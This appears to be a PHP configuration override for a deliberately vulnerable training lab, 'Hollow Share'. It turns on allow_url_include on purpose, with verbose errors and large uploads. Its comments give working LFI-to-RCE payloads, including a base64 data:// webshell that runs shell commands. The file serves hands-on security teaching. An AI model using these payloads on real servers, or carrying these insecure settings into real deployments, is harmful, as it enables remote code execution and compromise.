; PHP overrides for the Hollow Share portal (Chapter 09).
;
; === PLANTED VULNERABILITY (Station D support) ============================
; allow_url_include lets include()/require() pull from URL-style wrappers.
; With it On, the LFI in view.php becomes RCE via data:// and php://input:
;   ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
;   ?page=php://input   (with the PHP in the POST body)
; The secure default is Off; it is On here on purpose.
; =========================================================================
allow_url_fopen = On
allow_url_include = On

; Keep errors visible — helps learners see what their payloads do.
display_errors = On
display_startup_errors = On

; Generous upload limits so large webshells/images upload cleanly.
file_uploads = On
upload_max_filesize = 20M
post_max_size = 21M
